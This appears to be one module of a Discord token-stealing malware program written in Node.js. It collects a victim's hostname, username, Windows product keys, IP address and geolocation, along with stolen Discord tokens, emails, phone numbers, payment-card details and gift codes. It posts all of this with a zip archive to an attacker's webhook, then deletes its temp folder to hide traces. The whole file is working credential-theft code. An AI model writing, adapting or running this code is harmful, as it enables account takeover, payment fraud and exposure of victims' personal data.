const { webhook } = require('../config');
const { isValidURL, codeBlock, code } = require('../util/string');
const axios = require('axios');
const { join, sep } = require('path');
const os = require('os');
const fs = require('fs');
const { tempFolder } = require('../index');
const FormData = require('form-data');
const { rmSync, readFileSync } = require('fs');
const { userAgent } = require('../config');
const { nitroSubscriptionType, billingType, accountFlags, avatarURL } = require('../util/discord-account');
const { sleep } = require('../util/general');

if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;

const json = async (zipFile) => {
  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
  const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString());
  const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
  const computerInfoFields = [
    ['💾 RAM', Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB'],
    ['💾 CPUs', [...new Set(os.cpus().map(cpu => cpu.model.trim()))].join(', ')],
    ['👨 Name', code(os.hostname())],
    ['🕘 Uptime', `<t:${uptime}:R> (<t:${uptime}:f>)`],
    ['🥷 Username', code(os.userInfo().username)],
    ['🔄️ OS version', os.version()],
    ['🔑 Product Key', code(require('./product-key').productKey)],
    ['🔑 Backup Product Key', code(require('./product-key').backupProductKey)],
  ];
  const ipInfoFields = [
    ['1️⃣ IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
    ['🗺️ Location', `[${code(await ipInfo('lat') + ', ' + await ipInfo('lon'))}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
    ['ISP', code(await ipInfo('isp'))],
  ];

  const embeds = [];
  embeds.push({
    description:
      computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n') + '\n\n' +
      ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
  });
  for (const account of discordAccountInfo.accounts) {
    const nitroSubscriptionEnd = Math.floor(new Date((await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
      headers: { Authorization: account.token, 'User-Agent': userAgent }
    })).data[0].current_period_end).getTime() / 1000);
    embeds.push({
      description: `Token: ${codeBlock(account.token)}`,
      author: {
        name: `${account.username}#${account.discriminator}`,
        icon_url: account.avatar ? avatarURL(account.id, account.avatar) : `https://cdn.discordapp.com/embed/avatars/${account.discriminator % 5}.png`
      },
      fields: [
        ['🆔 ID', code(account.id)],
        ['📜 Bio', account.bio],
        ['🌍 Locale', code(account.locale)],
        ['🔞 NSFW Allowed', account.nsfw_allowed],
        ['🔐 MFA Enabled', account.mfa_enabled],
        ['✉️ Email', account.email ? code(account.email) : 'No Email'],
        ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
        ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type) + ` (ends <t:${nitroSubscriptionEnd}:R>)`],
        ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
      ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
      color: account.accent_color,
    });
  }
  discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
    title: `Discord Account - Billing - ${billingType(billing.type)}`,
    fields: (billing.type === 1 ? [
      ['👨 Name', billing.billing_address.name],
      ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
      ['🔚 Ends in', code(billing.last_4)],
      ['®️ Brand', billing.brand],
      ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
    ] : [
      ['👨 Name', billing.billing_address.name],
      ['✉️ Email', code(billing.email)],
      ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
    ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
  }); }) : embeds.push({
    title: 'Discord Billing', description: 'No Billing'
  });
  embeds.push({
    title: 'Discord Promotions',
    description: discordAccountInfo.gifts.length > 1 ?discordAccountInfo.gifts.map(gift => {
      return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
    }).join('\n') : 'No Promotions'
  });

  return {
    content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
    attachments: [{
      id: 0,
      filename: zipFile?.split(sep)?.pop(),
      content_type: 'application/zip',
      url: `attachment://${zipFile?.split(sep)?.pop()}`,
    }]
  };
};

module.exports = async (zipFile) => {
  const data = new FormData();
  data.append('files[0]', fs.createReadStream(zipFile));
  data.append('payload_json', JSON.stringify(await json(zipFile)));

  axios.post(webhook.url, data, {
    headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
  })
    .then(() => {})
    .catch(() => {});

  sleep(1000).then(() => rmSync(tempFolder, { recursive: true }));
};
